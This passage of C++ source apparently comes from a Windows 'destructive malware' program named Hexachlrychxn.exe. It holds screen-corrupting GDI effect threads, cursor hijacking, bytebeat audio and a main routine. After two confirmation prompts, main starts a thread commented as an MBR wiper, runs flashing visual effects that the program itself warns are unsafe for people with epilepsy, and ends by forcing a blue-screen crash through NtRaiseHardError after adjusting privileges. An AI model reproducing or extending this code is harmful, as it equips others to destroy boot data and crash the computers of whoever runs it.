    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(dcCopy, 1, 1, w, h, hdc, -2, -2, SRCCOPY);
        BitBlt(dcCopy, 1, 1, w, h, hdc, 2, 2, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI rectz(LPVOID lpParam) {
    while (TRUE) {
        HDC hdc = GetDC(HWND_DESKTOP);
        int X = GetSystemMetrics(SM_CXSCREEN);
        int Y = GetSystemMetrics(SM_CYSCREEN);
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        BitBlt(hdc, rand() % X, rand() % Y, rand() % X, rand() % Y, hdc, rand() % X, rand() % Y, PATCOPY);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI cur3(LPVOID lpParam) {
    POINT cursor;
    int signX = 1, signY = 1, incrementor = 10, x = 10, y = 10;
    while (1) {
        HDC hdc = GetDC(HWND_DESKTOP);
        int icon_x = GetSystemMetrics(SM_CXICON);
        int icon_y = GetSystemMetrics(SM_CYICON);
        GetCursorPos(&cursor);
        x += incrementor * signX;
        y += incrementor * signY;
        SetCursorPos(x, y);
        DrawIconEx(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(0, IDI_ERROR), 3 * GetSystemMetrics(SM_CXICON), 3 * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
        if (y >= GetSystemMetrics(SM_CYSCREEN)) signY = -1;
        if (x >= GetSystemMetrics(SM_CXSCREEN)) signX = -1;
        if (y == 0) signY = 1;
        if (x == 0) signX = 1;
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 1;
}

DWORD WINAPI shader7(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * log2((x ^ x) | x * i * y + 1));
                hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCERASE);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI setpixel(LPVOID lpParam) {
    int y = GetSystemMetrics(SM_CYSCREEN), x = GetSystemMetrics(SM_CXSCREEN);
    int inc = round(x / 100);
    while (1) {
        HDC hdc = GetDC(0);
        for (int yp = 0; yp < y; ++yp) {
            for (int xp = 0; xp < x; ++xp) {
                int xa = inc ^ xp;
                if (xa != 0) SetPixel(hdc, xp, yp, RGB(xa * 5, xa * 10, xa * 15));
            }
        }
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI shader8(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                rgbquad[index].rgbRed = x % 255;
                rgbquad[index].rgbGreen = y % 255;
                rgbquad[index].rgbBlue += x % 255;
            }
        }
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCERASE);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI tanwaves2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    for (;;) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = tan(angle) * 50;
            BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
            BitBlt(hdc, i, 0, 1, sh, hdc, i, a, NOTSRCCOPY);
            angle += M_PI / 60;
        }
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader9(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int t = (y ^ y) | x;
                rgbquad[index].rgbRed = (rgbquad[index].rgbRed + x + y) % 255;
                rgbquad[index].rgbGreen = (rgbquad[index].rgbGreen + x + i) % 255;
                rgbquad[index].rgbBlue = (rgbquad[index].rgbBlue + t + i) % 255;
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI sines(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    for (;;) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = sin(angle) * 50;
            BitBlt(hdc, i, 0, 1, sh, hdc, i, a, NOTSRCCOPY);
            angle += M_PI / 60;
        }
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI final(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HBRUSH brush = CreateSolidBrush(RndRGB());
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATCOPY);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// ============= BYTEBEATS =============
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 3) * (t >> 4) ^ (t >> 7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 10 & t >> 7 & 5 & t >> 3));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & t >> 6));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & t >> 7) + (t | t >> 9) + (t | t >> 8) + (t | t >> 9) & t >> 6);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        if (-t != 0) buffer[t] = static_cast<char>(((t + 16777218) & t >> 8) + t / 32769 / -t | t * t << 7 | t / t * t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * 3 + (t ^ (t * (t >> 4 | t >> 10))));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * 37 ^ (t + (t * (t >> 12 | t >> 9))));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (444 & t >> 7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(8 * t & t >> 18 & t >> 6 | 5 * t & t >> 9);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 4000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[4000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 8 | t | t >> 5) * 102 * (t & t >> 12 | t >> 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * t & t >> 16 & t >> 8 ^ (5 * t & t >> 9) - 2);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + 9 >> (t >> 8) * t * ((t >> 15 & 2) + 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        if (-t != 0) buffer[t] = static_cast<char>((t ^ 5 & 245) >> t / ((t >> 15 & 2) + 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        if (-t != 0) buffer[t] = static_cast<char>((1 * t & 2587) * (t >> 5 & 275) >> 9);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

// ============= MAIN =============
int main() {
    if (MessageBoxW(NULL, L"tHiS iS A dEStruCTIvE mAlwARE, rUn?", L"Hexachlrychxn.exe by VietNamLover", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"aRe yOu sUrE? iT wIlL sTIlL mOvE yOuR mOuSE aNd iT coNTaINs flAShINg lIGhTs - nOt fOr epILePSy", 
                    L"hEXaCHlrYChxN.eXe - fINaL wARniNG", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
            // Start MBR Wiper
            CreateThread(0, 0, MBRWiper, 0, 0, 0);
            Sleep(5000);
            CreateThread(0, 0, fakeerror, 0, 0, 0);
            Sleep(5000);
            CreateThread(0, 0, notepad, 0, 0, 0);
            Sleep(5000);
            HANDLE thread0 = CreateThread(0, 0, msg, 0, 0, 0);
            Sleep(1000);

            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread2 = CreateThread(0, 0, shk, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, msg2, 0, 0, 0);
            sound2();
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
            HANDLE thread3dot1 = CreateThread(0, 0, msg3, 0, 0, 0);
            HANDLE thread3dot2 = CreateThread(0, 0, cur1, 0, 0, 0);
            sound3();
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            TerminateThread(thread3dot2, 0);
            CloseHandle(thread3dot2);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread4 = CreateThread(0, 0, patblt, 0, 0, 0);
            HANDLE thread4dot1 = CreateThread(0, 0, msg4, 0, 0, 0);
            HANDLE thread4dot2 = CreateThread(0, 0, invcc, 0, 0, 0);
            sound4();
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            TerminateThread(thread4dot2, 0);
            CloseHandle(thread4dot2);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread5 = CreateThread(0, 0, tanwaves1, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, polygon1, 0, 0, 0);
            sound5();
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread6 = CreateThread(0, 0, shader3, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, cur2, 0, 0, 0);
            sound6();
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread7 = CreateThread(0, 0, y, 0, 0, 0);
            sound7();
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread8 = CreateThread(0, 0, shader4, 0, 0, 0);
            HANDLE thread8dot1 = CreateThread(0, 0, radius, 0, 0, 0);
            sound8();
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            TerminateThread(thread8dot1, 0);
            CloseHandle(thread8dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread9 = CreateThread(0, 0, blur1, 0, 0, 0);
            HANDLE thread9dot1 = CreateThread(0, 0, icon2, 0, 0, 0);
            HANDLE thread9dot2 = CreateThread(0, 0, textout, 0, 0, 0);
            sound9();
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            TerminateThread(thread9dot1, 0);
            CloseHandle(thread9dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread10 = CreateThread(0, 0, shader5, 0, 0, 0);
            HANDLE thread10dot1 = CreateThread(0, 0, log21, 0, 0, 0);
            sound10();
            TerminateThread(thread10, 0);
            CloseHandle(thread10);
            TerminateThread(thread10dot1, 0);
            CloseHandle(thread10dot1);
            TerminateThread(thread6dot1, 0);
            CloseHandle(thread6dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread11 = CreateThread(0, 0, shader6, 0, 0, 0);
            HANDLE thread11dot1 = CreateThread(0, 0, blur2, 0, 0, 0);
            HANDLE thread11dot2 = CreateThread(0, 0, rectz, 0, 0, 0);
            HANDLE thread11dot3 = CreateThread(0, 0, cur3, 0, 0, 0);
            sound11();
            TerminateThread(thread11, 0);
            CloseHandle(thread11);
            TerminateThread(thread11dot1, 0);
            CloseHandle(thread11dot1);
            TerminateThread(thread11dot2, 0);
            CloseHandle(thread11dot2);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread12 = CreateThread(0, 0, shader7, 0, 0, 0);
            HANDLE thread12dot1 = CreateThread(0, 0, setpixel, 0, 0, 0);
            sound12();
            TerminateThread(thread12, 0);
            CloseHandle(thread12);
            TerminateThread(thread5dot1, 0);
            CloseHandle(thread5dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread13 = CreateThread(0, 0, shader8, 0, 0, 0);
            HANDLE thread13dot1 = CreateThread(0, 0, tanwaves2, 0, 0, 0);
            sound13();
            TerminateThread(thread13, 0);
            CloseHandle(thread13);
            TerminateThread(thread13dot1, 0);
            CloseHandle(thread13dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread14 = CreateThread(0, 0, shader9, 0, 0, 0);
            HANDLE thread14dot1 = CreateThread(0, 0, tanwaves1, 0, 0, 0);
            HANDLE thread14dot2 = CreateThread(0, 0, sines, 0, 0, 0);
            sound14();
            TerminateThread(thread14, 0);
            CloseHandle(thread14);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread15 = CreateThread(0, 0, final, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread15, 0);
            CloseHandle(thread15);
            TerminateThread(thread0, 0);
            CloseHandle(thread0);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2dot1);
            TerminateThread(thread3dot1, 0);
            CloseHandle(thread3dot1);
            TerminateThread(thread4dot1, 0);
            CloseHandle(thread4dot1);
            TerminateThread(thread9dot2, 0);
            CloseHandle(thread9dot2);
            TerminateThread(thread11dot3, 0);
            CloseHandle(thread11dot3);
            TerminateThread(thread12dot1, 0);
            CloseHandle(thread12dot1);
            TerminateThread(thread14dot1, 0);
            CloseHandle(thread14dot1);
            TerminateThread(thread14dot2, 0);
            CloseHandle(thread14dot2);
            
            // BSOD Trigger (Final blow)
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);
    
            MessageBoxW(NULL, L"hEXaCHlrYChxN.eXe cOmPLetEd!", L"hEXaCHlrYChxN.eXe", MB_OK);

    Sleep(-1);
}